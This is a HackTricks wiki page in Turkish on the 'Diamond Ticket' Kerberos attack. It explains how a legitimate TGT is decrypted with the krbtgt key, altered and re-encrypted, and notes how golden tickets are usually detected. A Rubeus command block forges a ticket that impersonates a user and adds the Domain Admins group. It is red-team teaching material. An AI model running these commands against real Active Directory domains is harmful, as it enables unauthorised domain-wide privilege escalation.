# Diamond Ticket

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Diamond Ticket

**Altın bilet gibi**, bir elmas bilet, **herhangi bir kullanıcı olarak herhangi bir hizmete erişmek için kullanılabilen bir TGT'dir**. Altın bilet tamamen çevrimdışı olarak sahte bir şekilde oluşturulur, o alanın krbtgt hash'i ile şifrelenir ve ardından kullanım için bir oturum açma oturumuna geçirilir. Alan denetleyicileri, TGT'leri izlememektedir, bu nedenle (veya onlar) meşru bir şekilde verilmiş olanları kabul ederler, kendi krbtgt hash'i ile şifrelenmiş TGT'leri memnuniyetle kabul ederler.

Altın biletlerin kullanımını tespit etmek için iki yaygın teknik vardır:

* Karşılık gelen bir AS-REQ olmayan TGS-REQ'leri arayın.
* Mimikatz'ın varsayılan 10 yıllık ömrü gibi saçma değerlere sahip TGT'leri arayın.

Bir **elmas bilet**, **bir DC tarafından verilen meşru bir TGT'nin alanlarını değiştirmek suretiyle** yapılır. Bu, **bir TGT talep ederek**, alanın krbtgt hash'i ile **şifre çözerek**, biletin istenen alanlarını **değiştirerek** ve ardından **yeniden şifreleyerek** gerçekleştirilir. Bu, bir altın biletin daha önce bahsedilen iki eksikliğini **aşar** çünkü:

* TGS-REQ'leri, önceden bir AS-REQ'ye sahip olacaktır.
* TGT, bir DC tarafından verildiği için alanın Kerberos politikasından tüm doğru ayrıntılara sahip olacaktır. Bu ayrıntılar bir altın bilette doğru bir şekilde sahte olarak oluşturulabilse de, daha karmaşık ve hatalara açıktır.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **Bize katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi** **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
